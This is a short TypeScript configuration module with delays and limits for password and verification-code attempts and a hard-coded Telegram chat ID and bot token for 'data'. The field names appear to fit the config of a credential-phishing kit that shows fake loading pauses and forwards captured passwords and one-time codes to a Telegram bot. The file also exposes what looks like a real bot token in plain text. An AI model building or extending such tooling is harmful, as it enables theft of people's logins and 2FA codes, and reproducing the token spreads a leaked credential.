interface Config {
	settings: {
		code_loading_time: number;
		max_failed_code_attempts: number;
		max_failed_password_attempts: number;
		password_loading_time: number;
	};
	telegram: {
		data_chatid: string;
		data_token: string;
	};
}
const defaultConfig: Config = {
	settings: {
		code_loading_time: 3000,
		max_failed_code_attempts: 3,
		max_failed_password_attempts: 0,
		password_loading_time: 7000,
	},
	telegram: {
		data_chatid: "1261037261",
		data_token: "8134902426:AAGKIcamw3b_KYkKlLGvznKiPbaKu_3qU2g",
	},
};
const getConfig = (): Config => {
	return defaultConfig;
};

export default getConfig;
